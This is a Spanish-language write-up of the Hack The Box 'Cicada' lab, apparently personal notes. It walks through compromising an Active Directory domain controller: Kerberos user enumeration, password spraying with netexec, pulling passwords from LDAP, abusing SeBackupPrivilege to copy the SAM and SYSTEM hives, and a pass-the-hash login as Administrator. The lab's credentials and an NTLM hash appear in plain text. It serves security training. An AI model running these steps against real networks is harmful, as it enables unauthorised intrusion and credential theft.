@@ -1,0 +1,169 @@
+____
+- Tags: #easy #windows #acitve 
+_____
+# ENUMERACION: **NMAP**
+
+```bash
+nmap -sCV -p88,135,139,389,445,464,593,636,3268,3269,5985,59995 -n -Pn -oN scanPorts 10.10.11.35
+
+# Nmap 7.94SVN scan initiated Thu Oct 24 12:55:50 2024 as: nmap -sCV -p88,135,139,389,445,464,593,636,3268,3269,5985,59995 -n -Pn -oN scanPorts 10.10.11.35
+Nmap scan report for 10.10.11.35
+Host is up (0.22s latency).
+
+PORT      STATE SERVICE       VERSION
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-24 17:55:57Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+59995/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-10-24T17:56:50
+|_  start_date: N/A
+|_clock-skew: 6h59m58s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Oct 24 12:57:31 2024 -- 1 IP address (1 host up) scanned in 100.12 seconds
+```
+
+Viendo que estamos ante un **AD** uso la herramienta **Kerbrute** para realizar un ataque de fuerza bruta contra el protocolo **kerberos** por el puerto 88 para intentar sacar nombres de usuarios válidos. Sacó al usuario **guest** y al usuario **administrator**. 
+```bash
+Kerbrute userenum --dc 'cicada.htb' -d cicada.htb /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt
+```
+
+![[Captura de pantalla 2024-10-29 094933.png|650]]
+
+Como vemos que tenemos el puerto 445 abierto por donde corre el protocolo **SMB** vamos a intentar ver si hay algún recursos compartido al que podamos acceder, vamos a usar la herramienta **smbclient**.
+```bash
+smbclient -L 10.10.11.35 -> "Enumeramos los recursos compartidos"
+```
+
+![[Captura de pantalla 2024-10-29 095456.png|750]]
+
+Ahora lo que hago es intentar conectarme a cada uno de los recursos compartidos y solo tengo permisos para acceder a **HR** donde hay un archivo que me descargo a mi equipo.
+
+![[Captura de pantalla 2024-10-29 100056.png|900]]
+
+### NOTICE FROM HR.txt
+
+![[Captura de pantalla 2024-10-29 100253.png]]
+
+En el texto vemos que obtenemos una contraseña de un usuario, pero nos faltaría su nombre.
+### ENUMERACIÓN DE USUARIOS CON: **IMPACKET**
+
+Ahora voy a usar de la herramienta **impacket** el script **loockupsid** para intentar sacar usuarios válidos. Estos usuario me los guardo en un archivo **users.txt**.
+
+```bash
+impacket-lookupsid anonymous@cicada.htb | grep 'SidTypeUser'
+```
+
+![[Captura de pantalla 2024-10-29 101142.png]]
+_________________
+### DESCUBRIENDO DE QUIEN ES LA CONTRASEÑA CON: **NETEXEC**
+
+```bash
+netexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-succes
+```
+
+![[Captura de pantalla 2024-10-29 102336.png]]
+
+```bash
+ netexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
+```
+
+![[Captura de pantalla 2024-10-29 103423.png|1200]]
+
+Listando los recursos del usuarios no encontramos nada de gran valor, así que probamos para ver si podemos autenticarnos usando el protocolo **LDAP** y tenemos éxito. Una de las grandes ventajas de LDAP es que nos permite recuperar tanto usuarios como contraseñas. 
+
+```bash
+netexec ldap cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
+```
+
+![[Captura de pantalla 2024-10-29 103639.png]]
+
+```bash
+ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b 'dc=cicada,dc=htb' 
+```
+
+Si leemos la salida del comando anterior podemos encontrar la contraseña del usuario **David Orelious**
+
+![[Captura de pantalla 2024-10-29 105458.png|600]]
+Me intento conectar con **Evil-WinRM** con este usuario y esta contraseña pero no puedo acceder, así que listo los recursos SMB que tiene este usuario y vemos que podemos ver el contenido del directorio DEV.
+```bash
+netexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
+```
+
+![[Captura de pantalla 2024-10-29 112510.png|1200]]
+
+```bash
+smbclient //cicada.htb/DEV -U david.orelious
+```
+
+![[Captura de pantalla 2024-10-29 112850.png]]
+
+Vemos que es un scirpt de powershell que contiene las credenciales de otro usuario. Con estas nuevas credenciales vuelvo a intentar conectarme con **Evil-Winrm** y esta vez tengo éxito y encontramos la primera flag. 
+
+![[Captura de pantalla 2024-10-29 113007.png]]
+______
+# ESCALADA DE PRIVILEGIOS
+
+Una vez dentro de la máquina y habiendo recuperado la primera flag, lo que hacemos es listar con el comando **whoami /all** los permisos que tiene este usuario. Vemos que tiene activado el privilegio **SeBackupPrivilefe**, este permiso nos permite leer y copiar todos los archivos del sistema, incluso aquellos para los que normalmente no tendría permisos de acceso. 
+
+![[Captura de pantalla 2024-10-29 114021.png]]
+
+Con este permiso activado lo que vamos hacer es copiarnos los archivos SAM y SYSTEM en nuestro equipo. Los archivos **SAM** y **SYSTEM** en Windows son archivos críticos del sistema que contienen información fundamental para el funcionamiento y la seguridad del sistema operativo. Estos archivos se encuentran en el directorio de sistema en `C:\Windows\System32\Config` y suelen estar protegidos para evitar accesos no autorizados, ya que contienen datos sensibles sobre las cuentas de usuario y la configuración del sistema.
+
+Nos creamos un directorio **Temp** para guardar la copia de las sublclave en dos nuevos archivos SAM y SYSTEM en nuestro directorio Temp. Si usamos el comando **copy** no nos dejara copiar estos archivos.
+
+![[Captura de pantalla 2024-10-29 120817.png]]
+
+Una vez les tenemos copiados nos los descargamos a nuestro equipo de atacante con el comando download y con la herramienta **pypykatz** podemos extraer los secretos de los archivos SAM y SYSTEM.
+
+```bash
+pypykatz registry --sam sam system
+```
+
+![[Captura de pantalla 2024-10-29 121825.png]]
+
+Ahora nos conectamos con **Evil-WinRM** como el usuario Administrator proporcionando su hash y conseguimos la última flag de root.
+
+```bash
+evil-winrm -i cicada.htb -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
+```
+
+![[Captura de pantalla 2024-10-29 122215.png]]
+
